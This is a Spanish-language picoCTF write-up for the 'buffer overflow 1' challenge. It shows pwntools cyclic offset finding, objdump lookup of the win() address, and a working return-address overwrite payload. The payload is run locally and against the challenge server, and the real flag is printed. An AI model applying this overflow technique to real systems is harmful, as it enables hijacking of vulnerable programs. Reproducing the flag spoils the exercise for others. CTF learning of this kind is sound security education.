# USERNAME -> amcdanymx

#### Description

Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/252/vuln).You can view source [here](https://artifacts.picoctf.net/c/252/vuln.c). And connect with it using `nc saturn.picoctf.net 54445`

This challenge launches an instance on demand.  
Its current status is: `RUNNING`

Instance Time Remaining: `29:42`

Restart Instance
 

#### PISTAS

- Make sure you consider big Endian vs small Endian.
- Changing the address of the return pointer can call different functions.

#### SOLUCIÓN

Usamos la libreria de pwn para crear y reescribir el buffer con caracteres aleatorios

```
**

Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux

Type "help", "copyright", "credits" or "license" for more information.

>>> from pwn import *

>>> cyclic(100)

b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'

>>> cyclic_find(0x6161616c)

44

>>> 'A'*44

'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

>>> p32(0x080491f6)

b'\xf6\x91\x04\x08'

>>>

**

```

Consola

Dirección de memoria a saltar
```
➜  bufferoverflow1 objdump -D vuln -M intel | grep 'win'

080491f6 <win>:

 804922c:   75 2a               jne 8049258 <win+0x62>

➜  bufferoverflow1


```


Consola:

```
amcdanymx:bufferoverflow1/ $ ls                                         
vuln  vuln.c

amcdanymx:bufferoverflow1/ $  nc saturn.picoctf.net 54154                                           
Please enter your string:

sdfsds

Okay, time to return... Fingers Crossed... Jumping to 0x804932f

amcdanymx:bufferoverflow1/ $ code vuln.c                                                         
amcdanymx:bufferoverflow1/ $ chmod +x vuln                                                     
amcdanymx:bufferoverflow1/ $ ./vuln                                                              
Please enter your string:

asdasdasd

Okay, time to return... Fingers Crossed... Jumping to 0x804932f

amcdanymx:bufferoverflow1/ $ echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'| ./vuln

Please enter your string:

Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

[1] 37828 done            echo  |

    37829 segmentation fault  ./vuln

amcdanymx:bufferoverflow1/ $ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | ./vuln

  

Please enter your string:

Okay, time to return... Fingers Crossed... Jumping to 0x80491f6

Please create 'flag.txt' in this directory with your own debugging flag.

amcdanymx:bufferoverflow1/ $ echo 'flag{dummieflag}'>flag.txt                                        [15:16:11]

amcdanymx:bufferoverflow1/ $ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | ./vuln

  

Please enter your string:

Okay, time to return... Fingers Crossed... Jumping to 0x80491f6

flag{dummieflag}

[1] 39097 done            echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' |

    39098 segmentation fault  ./vuln

amcdanymx:bufferoverflow1/ $ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | nc saturn.picoctf.net 54154

  

Please enter your string:

Okay, time to return... Fingers Crossed... Jumping to 0x80491f6

picoCTF{addr3ss3s_ar3_3asy_c76b273b}%**

```

y obtenemos la bandera al conectarnos y mandar los datos en lugar de manera local al server:


picoCTF{addr3ss3s_ar3_3asy_c76b273b}